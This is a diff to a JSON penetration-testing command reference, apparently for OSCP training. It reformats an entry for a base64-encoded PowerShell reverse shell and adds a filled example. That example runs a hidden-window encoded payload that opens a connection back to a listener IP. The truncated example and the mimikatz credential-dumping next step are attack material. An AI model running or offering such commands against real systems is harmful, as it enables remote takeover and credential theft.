@@ -5,7 +5,7 @@
       "name": "PowerShell Base64 Encoded Reverse Shell",
       "description": "Base64-encoded PowerShell reverse shell for obfuscation and easy command-line execution",
       "command": "powershell -nop -w hidden -e <BASE64_PAYLOAD>",
-      "category": "SHELLS",
+      "category": "exploitation",
       "subcategory": "REVERSE_SHELL",
       "os": "WINDOWS",
       "variables": [
@@ -73,15 +73,26 @@
         "POST_EXPLOIT",
         "OSCP:HIGH"
       ],
-      "prerequisites": ["ps-reverse-shell-encoder-python", "nc-listener-setup"],
-      "alternatives": ["msfvenom-powershell-reverse", "bash-reverse-shell"],
-      "next_steps": ["mimikatz-sekurlsa-logonpasswords", "systeminfo-windows", "whoami-priv"],
+      "prerequisites": [
+        "ps-reverse-shell-encoder-python",
+        "nc-listener-setup"
+      ],
+      "alternatives": [
+        "msfvenom-powershell-reverse",
+        "bash-reverse-shell"
+      ],
+      "next_steps": [
+        "mimikatz-sekurlsa-logonpasswords",
+        "systeminfo-windows",
+        "whoami-priv"
+      ],
       "related_commands": [
         "ps-reverse-shell-encoder-python",
         "ps-winrm-invoke-command",
         "ps-wmi-invoke-method",
         "nc-listener"
-      ]
+      ],
+      "filled_example": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA..."
     }
   ]
 }
